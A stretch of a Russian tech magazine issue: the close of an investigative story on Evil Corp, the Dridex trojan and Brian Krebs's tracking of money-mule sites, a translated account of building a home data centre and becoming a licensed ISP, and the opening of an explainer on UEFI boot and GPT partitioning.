туса с замужней на раз веденную, на смену фамилии и на отчество ребенка,
которого она в 2012 году везла с собой в США. Многочис ленные детали,
вклю чая домашний адрес ребенка и совпадение даты его рождения с сооб‐
щением из чата хакеров, в котором aqua хвастался, что стал отцом, поз‐
волили ФБР удостовериться, что речь идет о первой жене и ребенке Якубца.
   Вот только никакого практического смысла в этом не было. Якубец (как
и Богачев и многие дру гие разыскиваемые хакеры) за границу России выез‐
жать не собирался. А Россия не собиралась его выдавать.
   Если слухи о том, что талантливым хакерам в Рос сии рано или поздно
делают «предложение, от которого невоз можно отказаться», верны, то можно
предположить, что визит силовиков и обыск в квартире изменил жизнь Мак‐
сима Якубца только к лучшему.


Dridex
Dridex — многокомпонентный банковский бот, имеющий множество версий.
Архитектура  троя  подразумевает  наличие  набора  модулей,  каждый
из которых несет свою функциональную нагрузку. Для свя зи с управляющим
сервером большинство редакций Dridex использует P2P‐протокол, ботнет
децентрализованный и одноранговый, что затрудня ет вме шательство в его
работу  и  перехват  управления. Данные,  которыми  бот обме нивается
с управляющим сервером, шифруются.
  В процессе работы Dridex встра ивает ся в проводник или процес сы бра‐
узеров и далее выполняется в контексте этих при ложений. По команде зло‐
умышленников трой может устра ивать веб‐инжекты, перехватывать вводимые
пользователем данные (кейлоггинг и формграббинг), красть пароли, выпол‐
нять поступающие команды и похищать конфиденциальную информацию
на зараженной машине.


К 2011 году Якубец соб рал свою собственную хакерскую группировку, пос‐
троенную вокруг нового трояна Dridex (также известного как Bugat и Cridex).
ФБР считает, что именно Якубец был разработчиком и главным распростра‐
нителем трояна, а также координатором сети денежных мулов. Дела у них
шли, разумеется, не всегда ровно — но в об винительном заключении ФБР
указываются разовые хищения сумм в миллион дол ларов и больше.





         Главные лица Evil Corp — Игорь Турашев и Максим Якубец

Эти деньги Якубец и его сообщники тра тили на дорогие машины и прочие
предметы роскоши, прожигая жизнь в стиле миллионеров‐плейбоев. Подоб‐
ный образ жизни позволил Якуб цу войти в узкий круг московской «золотой
молодежи», где он встретил свою вторую жену — Алену Бендерскую. С ней он
отдыхал на самом дорогом курорте Кры ма и в 2017 году сыграл свадьбу.





               Але на Бендерская, жена Максима Якубца

Но, помимо счастья в личной жизни, новый брак принес с собой и чрезвычай‐
но полезные связи. Не то чтобы у Якубца их совсем не было — судя по всему,
в его группиров ке Evil Corp состоял сын бывшего мэра Химок Владимира
Стрельченко.
  Однако женитьба на Алене Бендерской сделала Якубца родс твенником
еще более влиятельного человека по имени Эду ард Бендерский, бывшего
спецназовца ФСБ и президента благотворительного фонда бывших силови‐
ков «Вымпел». По сведениям американцев, в год свадьбы Яку бец уже совер‐
шенно точно сотрудничал с ФСБ, а в 2018 году получил лицензию на работу
со сведениями, составляющими государс твенную тай ну.





  Кадр из свадебного видео Максима и Алены — жениха все вре мя сни‐
  мают, не показывая лица, а само видео пытались вычистить из Сети —
  но не пре успели


        WWW

                      Если  тебе  интересно более подробно  узнать
                      о свя зях хакеров из Evil Corp с разными влиятель‐
                    ными людьми и о том, кто эти люди и чем они
                      занимаются, то в русскоязычной прессе есть нес‐
                        колько расследований на эту тему. Начать мож но
                        с  материала  «Медузы».  Подробнее  почитать
                      об Эдуарде Бендерском, его семье и репутации
                       крайне авторитетного охотника можно здесь.
                   И вот еще подборка материалов о связях этих
                     людей с организован ной преступностью: 1, 2, 3,
                     4.



УСПЕХИ ОДИНОКОГО СТРЕЛКА
Расследование ФБР, свя зи с рос сийскими силовиками, миллионы украден‐
ных долларов — все это чрез вычайно масштаб ные истории, затрагивающие
множество людей. Но история эксперта‐одиночки Брайана Кребса стоит
особняком, потому что ему удалось сделать кое‐что, с чем ФБР не спра‐
вилось.
   Его таинствен ные источники дали ему информацию о деталях схемы
по работе с денежными мулами, которую использовал Яку бец. Чтобы
выводить деньги из США, нужно было дос таточное количес тво «мулов» и воз‐
можность оператив но с ними связывать ся, выдавать им указания и получать
от них их личные и банковские данные. И так как многие «мулы» были людьми
с невысоким уровнем компьютерной грамотности, этот способ связи должен
быть достаточно простым в использовании.
  Решением Якубца ста ло соз дание системы сай тов, напоминавших кор‐
поративные пор талы управления персоналом — с профилями сотрудников
и рассылкой сооб щений, выг лядевших нас толь ко убе дительно, чтобы люди
искренне верили, что работа ют на легальный, про фессиональный бизнес.





            Общий вид сайта для работы с «мулами»

Однако во всей этой сис теме был один изъян. Любой человек, получивший
ссылку на сайт, мог на нем зарегистрироваться — и более того, прос то меняя
номер сообщения в адресной строке, пользователь сайта получал воз‐
можность читать сооб щения, предназначенные для других пользователей!





              Форма входа на один из таких сайтов

И Брайан Кребс несколько лет подряд именно этим и занимался. Каждое
утро он заваривал себе кофе и садился читать переписку за последние сутки,
в которой «денежным мулам» писали: «Доб рое утро, %username! Сегодня
наш клиент переведет вам день ги, после перевода снимите их наличными
в своем банке и перешлите нам».





                    Личные сооб щения для мулов

Разумеется, «клиентами» были очеред ные жертвы — в основном предста‐
вители малого бизнеса с пло хо налаженной кибербезопасностью. Но Брайан
Кребс оказывался последним рубежом их обо роны. Он гуглил по названию
компании из хакер ских писем, находил их телефон и сообщал, что фирму пря‐
мо сейчас грабят русские хакеры.
   «Вы, скорее всего, меня не зна ете, но вот вам мой сайт с информацией
о том, кто я и что я делаю. Ваши зарплатные счета взломали, и вы можете
потерять существенную сумму денег. Вам стоит немедленно поз вонить в ваш
банк и заморозить любые переводы в процессе оформления, пока еще не
слишком поздно. Потом вы можете поз вонить мне и расспросить меня о том,
как я все это узнал, — но сейчас, пожалуй ста, позвоните в ваш банк», —
писал пострадавшим Брайан.
   Таким образом порой Брайану Кребсу удавалось предотвратить прес‐
тупление прямо во время его совершения и избавить небольшие фирмы
от серьезных проб лем. Но порой, разумеется, ему не верили — и Брайану
приходилось беседовать с полицейски ми или агентами ФБР. Впрочем, раз‐
говор с правоох ранительными органами у него обычно получался коротким:
он независимый исследова тель, обвинить его не в чем, а полиции он не боит‐
ся, даже может прочитать прос тому полицейско му лекцию о киберпрес‐
тупности или привлечь внимание ФБР к серии прес туплений, которые иначе
агентство еще дол го не замечало бы из‐за малого масштаба жертв.
   Частенько Брайану уже приходилось вступать в напряженные беседы
с представителями власти или корпораций, когда те просили его задержать
выход очередного расследова ния или и вовсе не пуб ликовать его в инте‐
ресах следс твия или биз неса. Но Кребс в своем онлайн‐интервью на Reddit
утверждает, что правоохранитель ные орга ны огра ничивались лишь веж‐
ливыми просьбами, в исполнении которых он не видел для себя никакой
выгоды. А с корпорациями он и вовсе не намерен сотрудничать. Примером
твердости его убеждений может служить история с сайтом знакомств Ashley
Madison, представители которо го сна чала обещали ему денег за мол чание,
а после выхода статьи — гро зили судом.
   Так что Брайан Кребс не останавлива ется в своих расследованиях, хоть
и прекрасно знает, что хакеры тоже читают его блог, обсуждают его статьи,
радуются разрыву контракта с Washington Post и даже пытаются подбросить
ему наркотики через интернет. Известность — дело непростое: Кребс пишет,
что однажды он  захотел зарегистрироваться на очеред ном хакерском
форуме под сво им настоящим именем, но админ принял его никнейм за шут‐
ку. А на другом форуме такой никнейм уже был занят каким‐то крупным спе‐
цом по воровству номеров кредиток.
  Можно было бы предположить, что своими пуб ликациями Кребс осложня‐
ет жизнь в первую очередь самому себе. Но практика показы вает, что это не
так. Публикации в американском блоге могут заставить хакеров повол новать‐
ся или возгордиться, но, скорее всего, не изменят их образа действий.
В крайнем случае они поп робуют сменить никнейм на форуме — но за ними
все равно останется хвост из их старых постов, следов прошлых подвигов
и характерный почерк. Все эти материалы Кребс тщательно собирает в свой
архив, с помощью которого он и проводит столь впечатляющие расследова‐
ния.
  Но в конечном счете, пока между США и Рос сийской Федерацией нет сог‐
лашений о сотрудничестве правоохранительных органов и экстрадиции прес‐
тупников, хакерам мало что угрожает, если они не покидают границ Рос сии.
Кребс много пишет о том, что с киберпреступностью нужно бороться в пер‐
вую очередь за счет разумных практик кибербезопасности и широкого рас‐
пространения информации. Что в современном мире в «денежные мулы»
могут завербовать двенадцатилет него ребенка и семидесятилетнюю пен‐
сионерку — если кто‐то не объяснит им, что бесплат ный сыр бывает только
в мышелов ке.


ВЫВОДЫ
Из этих захватывающих историй следуют довольно банальные выводы. Вни‐
мательность и наблюдательность — как в слу чае с Брай аном Кребсом,
годами собирающим свои архивы и отслежива ющим связи одних хакерских
атак с другими, — вознаграждается, и сыщик‐одиночка получает шанс пре‐
дотвратить преступле ние, которое ФБР может лишь рас следовать пос тфак‐
тум.
  Беспечность же в вопросах безопас ности вредит и бизнесменам, которые
не доверяют сигналам тревоги «Вас грабят пря мо сейчас!», и хакерам, сме‐
шивающим на одном сервере личную переписку с управляющими командами
ботнета. Вредит она и прос тым людям, купившимся на обе щания легких
денег в интерне те.
  А насчет спец служб, невест со связями и бенгальских кошек — делай
выводы сам. Но старайся при этом соблюдать закон — пусть примером тебе
будет слава не Максима Якубца, а Брайана Кребса.
ТРЮКИ
КАША
ИЗ ТОПОРА

 КАК Я СТАЛ САМ СЕБЕ
 ИНТЕРНЕТ‐ПРОВАЙДЕРОМ





      Jason Hopper





Ты прочел верно: я установил у себя дома дата‐центр и стал
сам себе провайдером. Не то что бы я проснулся однажды
утром и такой: «Чем бы заняться сегодня? Стану собствен‐
ным интернет‐провайдером». Все про исходило постепен но.
Как в сказке «Каша из топора» — в какой‐то момент я пос‐
мотрел и понял: черт побери, да я же сделал собствен ный
дата‐центр! И если ты спро сишь: «Почему?», я отвечу прос‐
то: «Почему бы и нет?»


             INFO

                      Это перевод  статьи, впервые опубликованной
                        в блоге Hyperion Gray. Рассказал Джейсон Хоп‐
                         пер,  записал Дэвид  Таулер,  перевела Алёна
                       Георгиева.


На самом деле главной причиной ста ло то, что я очень много сканирую
интернет. Это не какое‐то сомнительное сканирование, а вполне себе кру‐
тое. В частности, глубоко сканирую каждый IP в интерне те — и делаю
это чрезвычайно быстро. Что, разумеется, дает очень серьезную нагрузку
на мою сеть — и на железо тоже. Сканировать так через традиционного про‐
вайдера почти невозможно: обычно они имеют строгие ограничения, а дос‐
таточной пропускной способ ности, напротив, не имеют. Есть, конечно, сер‐
висы, которые позволя ют использовать базу данных, но с ними столь объ‐
емное сканирование становится слишком дорогим — и довольно быстро.
   У меня было 250 тысяч долларов на счету одного провайдера VSP, да еще
и с ограничением по времени (как я к этому при шел — отдельная большая
история). И когда эти день ги закончились — а они закончились, и быс тро, —
мне пришлось искать какой‐то другой вариант.
  Я стал придумывать что‐то еще и пос ле некото рых подсче тов обнаружил,
что купить сервер в моей ситуации дешевле — нас только, что в итоге он оку‐
пился примерно за полгода. Большинс тво компаний полагают, что лучше
пользоваться облачным провайдером, — а может, всего лишь не хотят раз‐
бираться, — и просто исправно оплачивают выс тавленные счета. Но для тех‐
нологических компаний вроде нашей, кому нуж но не только сайт захостить,
это не вариант.


«ЧТО ПРЕДСТАВЛЯЕТ СОБОЙ ПРОЦЕСС?»
Поскольку повышенной секретности не требовалось, я пошел официальным
путем (вах‐вах!). Обратился к Канадской комис сии по радио, телевидению
и телекоммуникациям (CRTC), канадскому аналогу Федеральной комиссии
по связи Соединенных Штатов (FCC), чтобы получить базовую лицензию
международных телекоммуникационных сервисов (BITS), — в общем, Очень
Много Аббревиатур.


             INFO

                     От редакции: в России фун кции орга низаций,
                      обозначенных этими сок ращениями, выполняет
                      Роскомнадзор. Если вдруг решишься на беспри‐
                    мерный подвиг, ищи  в первую  очередь  две
                      лицензии —  на  телематические  услуги и  на
                      передачу данных за исключением передачи дан‐
                      ных для целей голосовой информации (то есть
                       без IP‐телефонии, на нее нужна отдельная лицен‐
                           зия).


Здесь потребовались кое‐какие юридичес кие действия, нотариус и офор‐
мление бумаг в трех экземплярах, но ходить на голове не пришлось —
в целом это впол не осу ществимо. Ой, чуть не забыл — есть еще период
общественного обсуждения заявки на лицензию, ког да люди могут написать,
что они думают по это му поводу. Я не получил ни одного комментария…
(Всплакнул.)
   Когда юридическая подготовка успешно завершилась и я получил офи‐
циальное разрешение продавать интернет, началось самое интересное.
Право‐то я получил — но продавать мне было нечего. Сам процесс меня
знатно фрустрировал, а стоимость интернета, который я мог бы переп‐
родавать, была очень высокой. И что же делать?
   Окей,  несколько  лет  назад  я  поз накомился  с  владельцем одного
интернет‐провайдера, и он рас сказал мне об «оптовом» интернете от боль‐
шого канадского провайдера Bell. Сам Bell об этой услу ге не распростра‐
няется — оно и понятно: зачем отдавать даром то, что можно продать
подороже? Правда, была одна серь езная проблема: чтобы продавать в роз‐
ницу «оптовый» интернет, нужно было про тянуть оптоволокно от крупного
узла доступа в мой дом. А это дополнительное строительство, разрешения
от города и куча других накладных расходов — в общем, месячная стоимость
выходила за разумные пределы. А если еще учесть, что договор нужно зак‐
лючать минимум на шесть лет…
   Лучше застре лите… Цитируя бессмертные сло ва Эксла Роуза, «куда мы
теперь?».
  Другой вариант: у одно го реселлера интернета от Bell было существенно
более доступное, но все еще дорогое предложение. Я знаю, о чем ты сейчас
думаешь: «Эй, Джейсон, а почему ты прос то не арендуешь стойку в колока‐
ционном центре?» Хороший вопрос. Я пробовал, но каждый новый сервер
заметно увеличивает арендную плату. C сетью все было прис тойно, но я дол‐
жен был делить ее с другими людьми — а это значит, что, если у меня или у
них будет какой‐то прог раммный баг, может рухнуть вся сеть, и никого это не
порадует.
  Помимо всего прочего, это все еще очень дорого — и я бы переплачивал
за функции, которые не собираюсь использовать. Такой план был бы жиз‐
неспособен, если бы у меня был фиксированный набор требований к обо‐
рудованию и я ничего не менял. Но в том‐то и загвоздка: мое сканирование
в ряду многих других операций не будет статичным; напротив, оно будет
более чем динамичным. Так что пришлось бы постоянно менять настройки
и функции — а это такая головная боль, что оно того не стоит. Но и это еще
не все  (глубокий вдох): колокации заявляют, что они работают безот‐
казно 99,99999% времени — этот показа тель называют «пять девяток».
Но если ты готов запустить сервер самос тоятельно и согласиться на 99,9% —
удивительная разница! — можно сэкономить немного денег. Ну и за нежела‐
тельные функции, вклю ченные в стоимость, переплачивать не придется.


«ЧТО ЖЕ ТЫ СДЕЛАЛ?»
Всё и сам.
  Выяснил, как построить собственную сеть, собрал билд, дополнил его
диаграммой сети и выложил на обсуждение в сабреддит /r/homelab. И да,
мой ник на «Реддите» реально 420SwagBootyWizzard — смирись с этим.





                   Первая версия дата‐центра

Двигаемся дальше: в сети есть пять основных компонентов, у всех названия
из «Стартрека».
 1. USS Defiant — Dell R710, основной шлюз обмена сообщениями. Раз‐
  мещает и анализирует все мои данные, а также управляет ими. Учитывая,
   что данные я собираю по всему интернету, на этом сервере висит доволь‐
   но много работы.
 2. Picard — моя установка глубокого обучения, обладающая несколькими
   графическими процес сорами (GPU) и самым мощным в дата‐центре CPU.
  Ее глав ная функция — быть машиной глубокого обу чения и анализа. Она
   очень экономит время, когда я работаю над очередным проектом — ана‐
   литическим или по машинному обучению.
 3. Janeway — очень мощная база данных с твердотельным накопителем
   (SSD) большого объ ема. В ней соб раны несколько SSD «корпоративного
   уровня». База данных должна иметь очень высокую скорость записи, что‐
  бы не отставать от поступа ющих данных, и располагать многотерабайтным
   хранилищем. Собрать этот сервер было доволь но сложно. Он должен
   не только быстро записывать, но и быс тро счи тывать, выдерживать
   интенсивную запись, а также иметь большую вмес тимость. Удовлетворить
   все эти требования было непросто. Я подсчитал, что обычный SSD (нап‐
   ример, Samsung Evo 860), скорее всего, умрет за год использования.
 4. Дальше идет Delta Flyer , еще один Dell R710. Это сервер моей вир туаль‐
   ной машины, на котором кру тится среда Proxmox.
 5. И наконец, Databanks (я пла нировал наз вать его в честь бортового
   компьютера корабля «Энтерпрайз», но не смог найти имя — если
   кто‐нибудь подскажет, буду признателен). В основном он работает
   как сервер DNS и сетевой накопитель (NAS) от Synology. Он имеет очень
   большую емкость и использует ся главным обра зом для бэкапов и архи‐
   вирования — но его можно подцепить к любой виртуальной машине
   или другому серверу, которому нуж но хранить несколько больших папок.


        WWW

                      Если хочешь узнать побольше о DNS‐серверах
                      и их использовании в кибератаках, загляни в мой
                        блог.





                     Вторая версия дата‐цен тра

Заодно мы перестроили наш дом — в смысле, я такой: камон, это лучший
момент, чтобы добавить еще немного про водки! До этого моя жена думала,
что я просто чуть более чокнутый, чем обычно, — но теперь она все поняла
и оценила. После ремонта дома и укладывания новой проводки я пошел
еще дальше — и разорился на остеклен ный дата‐центр и пару точек доступа
Wi‐Fi бизнес‐класса. В ито ге получилась очень маленькая комната — но мно‐
го места под мои нужды.





                         Точки доступа Wi‐Fi

Я уверен, ты уже оценил, насколько значительны затраты: серверы, корпус,
направляющие, распределение питания, источник бесперебойного питания
(просто большой аккумулятор — чтобы при перебоях электроэнергии компы
продолжали работать) и так далее. Все нарас тает как снежный ком —
и довольно быстро. Но, с другой стороны, поскольку теперь я технически
лицензированный интернет‐провайдер, я могу легально продавать интернет
своим соседям — что, конечно, довольно гнус но. Однако куда важнее, что
все это может облегчить мои исследования достаточно эффективным эко‐
номически способом. И хотя в целом проект дорогой, в дол госрочной пер‐
спективе все впол не рентабельно и реально может отбиться за первые нес‐
колько лет. И я знаю, что прыгнул пря мо сейчас на двадцать уровней крутости
вверх, — но постараемся держать себя в руках, верно? :P


«ЧТО СОБИРАЕШЬСЯ ДЕЛАТЬ ДАЛЬШЕ?»
Поскольку работа еще не завершена, я не могу выстроить четкой картины
будущего. Полагаю, что буду развивать и развивать свой проект, потому что,
если честно, мне нравится быть самому себе провайдером — можно даже
сказать, королем собственного домена. Теперь у меня есть свобода, ско‐
рость и пропускная способность, чтобы ска ниро вать то, что мне нравится,
и так часто, как я хочу. Я не говорю, что тебе обя зательно стоит последовать
моему примеру, — говорю лишь, что ты мог бы. Это было на удивление легко
и очень весело.
  Одной из первых идей было предложить этот путь иссле дователям инфо‐
сека, потому что, например, мы этим уже занимаемся, — и теперь, когда про‐
ект запущен и работает, мы определенно хотим предложить его тем, кто про‐
фессионально иссле дует инфо безопас ность. Когда я выяснил, насколько
трудно исследовать информа ционную безопас ность крупных облачных про‐
вайдеров, я подумал: а ведь было бы неплохой идеей под держать исследова‐
ния, предоставив доступ к общим датасетам и совместным исследованиям.
И хотя с тех пор мы немного отошли от этой мыс ли из‐за особенностей
логистики и управле ния клиентами, это определенно остается вариантом
на будущее.
ТРЮКИ
       GRAND
     PARTITION
         THEFT





                                                                             Ксения Кирилова
                                                                                                  Desperately in love with
                                                                                                           Linux and C
                                                                                              kclo3@icloud.com



                   КОПАЕМСЯ В UEFI
               И ПЫТАЕМСЯ ПОНЯТЬ,
           ПОЧЕМУ У НАС ОТНЯЛИ BIOS





Казалось бы, нет задачи про ще, чем загрузка компьюте ра:
нажал на кнопку питания, и спустя непродолжительное вре‐
мя на экране появится интерфейс опе рационной системы.
На самом же деле именно между этими двумя событи ями
в недрах машины и про исходит все самое интересное. Осо‐
бенно если используется UEFI и диск с разметкой GPT.
Давай заглянем под капот тво его ноута или компа и пос‐
мотрим, как загружаются устройства, использующие самые
современные технологии.


ЧТО НЕ ТАК С BIOS?
Сам термин BIOS археоло ги впервые обна ружили в коде CP/M от 1975 года.
Исходные тексты CP/M, в файле BDOS.PLM (CP/M 1.1) которых под авторс‐
твом Гэри Килдалла и появилось упоминание BASIC I/O SYSTEM, Computer
History Museum выложил в сво бодный доступ в 2014‐м в честь 40‐летия сис‐
темы. Если тебе интересно ознакомиться с этим историческим артефактом,
они доступны на сайте музея.
  Базовая система ввода‐вывода в некото ром смысле выполняет функцию
интерфейса между оборудованием и ОС, без нее операционка не загрузится,
а железо останется холодным и безжизненным. К тому же в ней есть функции,
которые можно вызывать из ОС для дос тупа к базовым возможностям обо‐
рудования, подоб но тому, как приложения используют системные вызовы
для доступа к функциям ОС. Однако операционные системы все же пред‐
почитают использовать собственные драй веры для работы с оборудованием.
  В x86‐системах BIOS выполняет тестирование (POST) и ини циализацию
оборудования. Затем управление переда ется первичному загрузчику (master
boot code), который ищет активный раз дел и его загрузочный сектор, чтобы
передать управление ему для загрузки операционной системы. В BIOS
используется формат разметки MBR, который тем не менее строго опре‐
деленного стандарта не имеет.


             INFO

                     Например, Крис Касперски в своей книге «Вос‐
                         становление данных. Практическое руководство»
                        писал, что в последние четыре байта, отведенные
                      под код первичного загрузчика, Windows записы‐
                       вала идентификатор диска, и это неизбежно уби‐
                       вало использующий их загрузчик. Таким образом,
                       для корректной работы с Windows первичный заг‐
                        рузчик должен был занимать не более 442 байт
                      вместо честно выделен ных ему 446.


BIOS за 45 лет существо вания показа ла себя невероятным долгожителем
мира IT, пережив дискеты, CP/M и PL/M, MS‐DOS и Windows 9x. Но сколько
ни обновляй ее под современные реалии, в выделенные для начального заг‐
рузчика 446 байт сейчас много ненужного не поместишь. Были у BIOS и дру‐
гие недостатки, из‐за которых наз ревала необ ходимость заменить 16‐битную
архитектуру, по крайней мере для «большого железа» вчетверо большей раз‐
рядности. Так посчитали ребята из Intel, и в 1998 году был основан проект In‐
tel Boot Initiative. Исходная версия спецификации, раз работанная в первую
очередь для машин на Itanium (IA‐64), была опубликована под названием EFI
(Extensible Firmware Interface) в 1999 году. А в 2005‐м на базе этого проекта
появился Uniﬁed EFI Forum, занимающийся разработ кой и поддержкой родив‐
шейся таким образом технологии по сей день.


ПРИШЛА БЕДА ОТКУДА НЕ ЖДАЛИ
Иногда можно встретить обозначение UEFI BIOS. Из названия понятно, что
UEFI позиционируется как расширяемый интерфейс между аппаратной плат‐
формой и опе рационной системой, предос тавля ющий таблицы и вызовы,
которые доступны загрузчику ОС. Тем самым соз дается окружение для заг‐
рузки.
  Помимо основной программы из прошивки, UEFI может использовать
модули для расширения своей функциональности, например для под держки
нового оборудо вания или файловых систем. Подразуме вается, что достаточ‐
но написать драйвер UEFI и он будет работать оди наково на всех совмести‐
мых операционных сис темах. Вооб ще, система прерываний BIOS была при‐
думана чуть ли не для того же: при появлении нового устройства дос таточно
добавить его поддержку в BIOS, а ОС могла бы обращаться к устройству пос‐
редством базовой системы ввода‐вывода — не зря же ее так наз вали.
  Кроме того, интерфейс этот зовется уни фици рованным. Спецификация
указывает одной из целей раз работки UEFI сделать так, чтобы разные опе‐
рационки могли грузиться на разном железе без внесения изме нений в ОС
или аппаратную платформу. Иными сло вами, UEFI играет роль допол нитель‐
ного слоя абстракции, в стандарте определен даже EFI Byte Code (EBC).
Цели, безусловно, благие. Жаль, исполнение подкачало — реализовывать
стандарт каждый волен по‐своему,  и,  к примеру, китай ские прошивки,
как иногда пишут на форумах, спо соб ны иной раз удивлять своим поведе‐
нием.


Объ ект ненавис ти
Внедрение UEFI в пользовательские системы наделало немало шуму. Быть
может, ты помнишь, как были рады линуксоиды, когда появи лись ноуты
на Windows 8 и для их сертифика ции Microsoft тре бовала Secure Boot.
При этом изначально предусматривать ее отклю чение или установку любых
клю чей, кроме ключей MS, не считалось необ ходимым. Нетрудно представить
проблемы установки, а скорее даже запус ка сторонних ОС в таком слу чае.
  Не очень лестно об UEFI отзывался и Линус Торвальдс. В списке рассылки
ядра Linux он говорит, что «EFI — это еще один факт повреждения моз га Intel
(первым был ACPI)», и сожалеет, что UEFI захватывает x86‐машины, тогда
как появился он для IA‐64. То ли дело BIOS, из которого никто не пытался
соорудить карету и который делал лишь то, для чего был предназначен: just
load the OS and get the hell out of there. По поводу Secure Boot Линус тоже
как‐то высказался не самым лестным образом.


Но все же давай посмотрим, какие у UEFI имеются дос тоинства.
   Во‐первых, с приходом UEFI раз мер диска боль ше не ограничен значени‐
ем в 2 ТиБ и составляет 8 ЗиБ — такие носите ли, наверное, появятся еще не
скоро. Во‐вторых, его отличие от традиционных BIOS в том, что он загружает
файлы со специального раз дела EFI system partition (ESP), вместо того чтобы
искать код начального загрузчика внутри таблицы разделов. То есть UEFI выс‐
тупает более высокоуровневым загрузчиком, так как изначально способен
работать с файлами на раз делах (но из коробки, как правило, поддерживает
только FAT, а для других файловых систем необходимо устанавливать драй‐
веры UEFI). Достаточно отформа тировать флешку в FAT и положить на нее
в каталог /EFI/BOOT/ файл с образом, который UEFI подхватит для даль‐
нейшей загрузки, и поч ти не надо думать загрузоч ная флешка готова!
  Вместе с UEFI был разработан и новый стандарт раз метки дисков GPT
(GUID Partition Table). В спецификации UEFI называ ются следующие преиму‐
щества нового формата перед старым доб рым MBR:
 • адреса логических блоков (LBA) ста ли 64‐битными вмес то 32‐битных
   в MBR (чем и преодолели ограничение на размер диска в 2 ТиБ);
 • поддерживается намного больше разделов, чем четыре основных в MBR;
 • для обеспечения избыточности вво дится запас ная таблица раз делов;
 • используется механизм контрольных сумм CRC32 для обеспечения целос‐
   тности служебных таблиц;
 • используется GUID и читабельное имя раз дела для его идентификации.

Давай теперь посмотрим, как это добро устроено и работает.


Немного об архитек туре системы UEFI
Базовая часть UEFI хранится в прошивке, но, поскольку количество доступной
памяти на плате ограничено, а функций у UEFI больше, чем у BIOS, предус‐
мотрена возможность использовать модули, которые подгру жаются с внеш‐
них носителей. Это могут быть дополнительные драйверы или при ложения,
которые  позволяют  рас ширить функци ональ ность:  добавить  поддержку
дополнительных файловых  систем  или  устройств,  предоставить  поль‐
зовательскую оболочку или дать поиг рать в тетрис.
   Загрузчики ОС, например GRUB2, для UEFI считаются приложением. Есть
возможность даже загружать операци онные системы напрямую из UEFI,
минуя отдельный загрузчик, будь то GRUB, загрузчик Windows или любой дру‐
гой. Для загрузки приложений и драйверов в UEFI используется Boot manag‐
er. Эти самые драйверы и приложения имеют рас ширение .efi и являются
UEFI‐образами, формат которых базиру ется на PE32/PE32+ или COFF.
   Стандарт UEFI, помимо интерфейсов, имеет собственные протоколы вза‐
имодействия  своих  модулей:  Simple  File  Protocol  для  чте ния файлов
с устройств, про токолы взаимо действия драйверов и при ложе ний со средой
UEFI, среди которых Secure Boot, и мно го чего еще.
  В рамках UEFI есть такая занятная вещь, как UEFI Shell. Этот шелл не всег‐
да присутствует в прошивке компьютера, но мож но создать загрузочную
флешку и запускать шелл с нее. Или ско пировать UEFI Shell на EFI‐раздел
диска, и после небольших страданий стараний он появится в опциях загрузки.
UEFI Shell может пригодиться, нап ример, для редактирования загрузчика
UEFI, запуска UEFI‐приложений или в каких‐нибудь иссле довательских целях.
   Эта оболочка с интерфейсом командной строки поз воляет без загрузки
ОС выполнять простые файловые операции вроде просмотра содержимого
директорий, копирования и удаления, запускать драйверы и приложе ния
UEFI, работать с сетью и пра вить меню заг рузки. Сущес твует дополнительный
набор программ от Intel, UEFI Disk Utilities, с которым можно даже размечать
диски. В оболочке поддерживается выпол нение скриптов, перенаправление
вывода и конвейер, файловые шаблоны, история команд и прочие вещи,
напоминающие о bash (зато дополнение по табу не работает). Из‐за подоб‐
ных возможностей, превосходящих задачи прос того первичного загрузчика,
UEFI и называют иногда псевдоОС.





  UEFI Shell в виртуалке. Русские имена фай лов не показывает, зато он
  разноцветный

Для корректной работы и загрузки внеш них приложений UEFI необходим
диск, отформатированный по новому стандарту. Пришло вре мя немного углу‐
биться в его устрой ство.


О раз метке дисков GPT
Первый логический блок на носителе — LBA0 — содержит так называемый
защитный  (protective) MBR на случай, если старые программы, слыхом
не слыхавшие о GPT, сочтут диск нерабочим и решат его исправить. Также
благодаря  защитному MBR  вмес то  действительной  раз метки  старое
ПО будет видеть один большой раздел, именуемый GPT protective partition.
  Следом идет первичная таблица GPT. В ней хранится заголовок GPT (GPT
header) с общей информацией: сигнатурой и версией GPT, GUID дис ка, кон‐
трольными суммами служебных таб лиц и про чими полезными вещами. Рядом
с заголовком находится мас сив записей о разделах (Partition entry array),
в котором описывается каждый раз дел на носителе: GUID типа раздела, GUID
раздела, LBA начала и конца, атрибуты и имя. После таблицы раз делов сле‐
дует FirstUsableLBA, то есть блок, который может быть использован непос‐
редственно для раздела.
  В первичной таблице есть LBA запасной (Backup) GPT, идентичной пер‐
вой, только значения ее полей MyLBA и AlternativeLBA меня ются местами.
Запасная таблица находится в последнем бло ке диска, перед ней рас‐
положена еще одна таблица с запися ми о разделах, так что поле Partitio‐
nEntryLBA также имеет другое значение.
  Для хранения допол нительных прог рамм UEFI может присутствовать отно‐
сительно небольшой (в районе 100–200 Мбайт) сис темный раздел ESP.
Обычно он располагается пер вым и имеет тип FAT32. В слу чае загрузочных
флешек вся флешка форматиру ется в FAT, поэтому там нет необ ходимости
создавать отдельный ESP. Зна чения системных переменных и конфигурация,
например порядок загрузки, хранит ся в NVRAM.
  Примерное относительное расположение всех этих элементов ты можешь
посмотреть на схеме, более подробные определения таблиц доступны в спе‐
цификации.





          Схе матич ное представление основных структур GPT

Как видишь, здесь мало общего с разметкой MBR, нет практически никакой
совместимости (есть, правда, Hybrid MBR, но мы о нем сейчас не будем
говорить). Зато теперь можно насоздавать кучу здоровых разделов, при чем
без костылей в виде основных и рас ширенных томов.


                                     Продолжение статьи →
ТРЮКИ               ← НАЧАЛО СТАТЬИ
    GRAND PARTITION
              THEFT
            КОПАЕМСЯ В UEFI И ПЫТАЕМСЯ ПОНЯТЬ,
                     ПОЧЕМУ У НАС ОТНЯЛИ BIOS





Загрузоч ная последовательность
Загрузка в среде с UEFI тоже усложнилась, но не настолько, чтобы мы
не сумели понять основные принципы. Например, так же как и в BIOS, выпол‐
няется начальная инициализация обо рудования. Теперь за нее отвечает Plat‐
form Initialization (PI), спецификацию которой можно найти в первом томе
документа Platform Initialization (PI) Speciﬁcation. Примерно вот так выглядит
загрузочная последовательность UEFI.




                Процесс загрузки плат формы с UEFI

Рассмотрим шаги загрузки по порядку:


Инициализация обо рудо вания (Pre-EFI Initialization)
На данном этапе всю работу выполняет, как уже сказано, часть стандарта
под названием PI. PI должна определить при чину старта (перезагрузка, выход
из сна, простое включение) и инициализировать процессор, чипсет и сис‐
темную плату. Сюда входит также орга низа ция среды выполнения драйверов,
и может присутствовать модуль совместимости CSM (Compatibility Support
Module) для загрузки с MBR, которая по умолчанию не поддерживается. Пос‐
